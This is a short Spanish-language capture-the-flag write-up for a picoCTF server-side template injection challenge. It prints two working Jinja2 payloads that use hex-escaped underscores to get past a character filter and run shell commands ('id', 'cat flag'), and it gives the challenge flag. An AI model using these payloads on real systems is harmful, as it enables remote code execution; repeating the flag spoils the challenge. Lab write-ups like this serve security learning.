## Descripción :
	I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.
## Solución :
Primero intente con los comandos que use en el reto SSTI1 pero estos no funcionario, asiq ue busque documentacion y habian otros comandos y habia info sobre que algunas paginas bloquean el uso de 
```
_ y .
```
y encontré codigo que no los usa 
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

```
para encontrar el 'os' entonces cambie el id por 'cat flag' y obtuve la bandera 

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
	
![[Pasted image 20250416192148.png]]
	picoCTF{sst1_f1lt3r_byp4ss_e964f71b}

